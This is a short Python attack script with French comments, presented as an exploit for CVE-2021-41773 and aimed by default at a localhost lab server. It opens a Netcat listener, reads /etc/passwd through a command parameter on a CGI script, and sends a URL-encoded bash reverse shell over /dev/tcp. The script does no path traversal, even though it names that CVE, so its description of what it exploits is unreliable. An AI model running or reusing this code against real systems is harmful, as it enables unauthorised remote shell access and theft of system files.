import subprocess
import time

def exploiter_cve_2021_41773(url_base, attacker_ip="127.0.0.1", port_listener=4444):
    print("\n[+] Exploitation de la CVE-2021-41773")
    print("[*] Lancement du listener Netcat sur le port", port_listener)

    # Démarrage du listener en arrière-plan
    listener_process = subprocess.Popen(["nc", "-lvnp", str(port_listener)])

    # Petite pause pour s'assurer que le listener est actif
    time.sleep(1)

    # Étape 1 : Lecture du fichier /etc/passwd via passwd.cgi
    url_passwd = f"{url_base}/cgi-bin/passwd.cgi?cmd=cat%20/etc/passwd"
    print(f"[+] Envoi de la requête vers {url_passwd} ...")
    subprocess.run(["curl", url_passwd, "-o", "passwd.txt"])
    print("[+] Résultat sauvegardé dans passwd.txt")

    # Étape 2 : Envoi du reverse shell via shell.cgi
    reverse_shell_cmd = f"bash -i >& /dev/tcp/{attacker_ip}/{port_listener} 0>&1"
    encoded_cmd = reverse_shell_cmd.replace(" ", "%20").replace(">", "%3E").replace("&", "%26").replace("/", "%2F")
    url_shell = f"{url_base}/cgi-bin/shell.cgi?cmd={encoded_cmd}"

    print(f"[+] Envoi du reverse shell vers {url_shell}")
    subprocess.run(["curl", url_shell])

    print("[!] Le reverse shell a été envoyé. Vérifiez si la connexion s'établit dans le terminal du listener.")
    input("Appuyez sur ENTER pour arrêter le listener.\n")

    # Fermeture du listener
    listener_process.terminate()
    listener_process.wait()
    print("[+] Listener arrêté.\n")
if __name__ == "__main__":
    exploiter_cve_2021_41773("http://localhost:8080", attacker_ip="127.0.0.1", port_listener=4444)

